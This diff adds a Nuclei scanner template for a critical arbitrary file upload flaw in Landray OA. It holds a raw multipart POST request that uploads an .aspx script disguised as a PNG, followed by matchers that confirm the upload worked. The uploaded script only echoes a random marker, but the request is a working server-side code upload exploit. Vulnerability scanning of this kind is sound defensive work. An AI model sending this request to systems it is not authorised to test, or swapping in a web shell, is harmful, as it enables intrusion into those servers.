@@ -1,0 +1,55 @@
+id: landary-oa-frm_form_upload-fileupload
+
+info:
+  name: 蓝凌OA frm_form_upload 任意文件上传
+  author: ro1t
+  severity: critical
+  reference:
+    - https://mp.weixin.qq.com/s/DorHJncR89z9XvyTwalnFA
+  tags: landray,oa,landray-eis,vuln
+
+variables:
+  boundary: "{{hex_encode(rand_text_alphanumeric(32))}}"
+  filename: "{{to_lower(rand_base(7))}}"
+  string: "{{randstr}}"
+
+http:
+  - raw:
+      - |
+        POST /frm/frm_form_upload.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: */*
+        Accept-Language: zh-CN,zh;q=0.9
+        Content-Type: multipart/form-data; boundary={{boundary}}
+        Connection: keep-alive
+        Cookie: ASP.NET_SessionId=fqq0ks45w4yqpev52l3adnet; FIOA_IMG_FOLDER=FI; Lang=zh-cn
+        Cache-Control: no-cache
+        Pragma: no-cache
+
+        --{{boundary}}
+        Content-Disposition: form-data; name="__VIEWSTATE"
+
+        /wEPDwUKMTgyMDI2MjI1NQ9kFgJmD2QWAgIBDw8WAh4EVGV4dAUG5L+d5a2YZGRkBUW9Q0DcNX2v8bIwXTLagEBcnZQ=
+        --{{boundary}}
+        Content-Disposition: form-data; name="__EVENTTARGET"
+
+        GB_SAVE
+        --{{boundary}}
+        Content-Disposition: form-data; name="__EVENTARGUMENT"
+
+        保存
+        --{{boundary}}
+        Content-Disposition: form-data; name="tpfile"; filename="{{filename}}.aspx"
+        Content-Type: image/png
+
+        <% Response.Write("{{string}}") %>
+        --{{boundary}}--
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200"
+          - "contains(body_1,'.asp')"
+          - "contains(body_1,'frm_pics/')"
+        condition: and
